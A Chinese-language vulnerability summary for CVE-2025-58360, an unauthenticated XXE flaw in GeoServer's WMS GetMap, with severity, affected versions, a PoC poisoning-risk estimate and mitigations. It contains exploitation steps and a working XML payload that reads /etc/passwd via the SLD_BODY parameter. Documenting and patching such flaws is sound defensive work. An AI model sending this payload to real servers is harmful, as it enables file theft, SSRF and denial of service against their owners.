## CVE-2025-58360-GeoServer-XXE

**漏洞编号:** CVE-2025-58360

**漏洞类型:** XXE

**影响应用:** GeoServer

**危害等级:** 高危，可能导致敏感信息泄露、SSRF、DoS攻击

**影响版本:** < 2.25.6, >= 2.26.0 and < 2.26.2

**利用条件:** 无需身份验证，可通过网络访问GeoServer的WMS服务

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-58360 是 GeoServer 中存在的一个 XML 外部实体 (XXE) 漏洞。该漏洞位于 WMS GetMap 功能中，允许未经身份验证的攻击者通过构造恶意的 XML 请求读取服务器上的任意文件、执行服务器端请求伪造 (SSRF) 攻击或触发拒绝服务 (DoS) 攻击。

**有效性：**
提供的 POC 代码是有效的。它演示了如何利用 `SLD_BODY` 参数注入包含外部实体定义的 XML，从而实现文件读取、SSRF 和 DoS 攻击。

**投毒风险：**
该漏洞利用代码本身主要是演示漏洞的利用方式，直接包含恶意后门的可能性较低。但是，使用者在下载和使用这些POC脚本时，仍需进行代码审计，以防作者在其他地方植入恶意代码，例如在下载脚本中添加额外的恶意操作或者在自动化利用脚本中加入反制措施。综合评估，投毒风险较低，大约5%。

**利用方式：**
1.  **确定目标版本：** 确认目标 GeoServer 版本是否在受影响范围内（< 2.25.6 或 >= 2.26.0 且 < 2.26.2）。
2.  **构造恶意 XML：** 构造包含外部实体定义的 XML 载荷。例如，读取 `/etc/passwd` 文件的载荷如下：

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <sld:StyledLayerDescriptor xmlns:sld="http://www.opengis.net/sld" version="1.0.0">
      <sld:UserLayer>
        <sld:LayerFeatureConstraints>
          <sld:FeatureTypeConstraint>&xxe;</sld:FeatureTypeConstraint>
        </sld:LayerFeatureConstraints>
      </sld:UserLayer>
    </sld:StyledLayerDescriptor>
    ```

3.  **发送 POST 请求：** 将构造的 XML 载荷作为 `SLD_BODY` 参数的值，通过 POST 请求发送到 `/geoserver/wms` 端点。
4.  **获取结果：** 从响应中提取包含的文件内容、SSRF 结果或观察 DoS 攻击的影响。

**缓解措施：**
*   升级到 GeoServer 2.25.6、2.26.3 或 2.27.0 及更高版本。
*   如果无法立即升级，可以使用 Web 应用程序防火墙 (WAF) 或 mod_security 规则阻止包含 `<!ENT` 的 XML 请求。

**项目地址:** [B1ack4sh/Blackash-CVE-2025-58360](https://github.com/B1ack4sh/Blackash-CVE-2025-58360)

**漏洞详情:** [CVE-2025-58360](https://nvd.nist.gov/vuln/detail/CVE-2025-58360)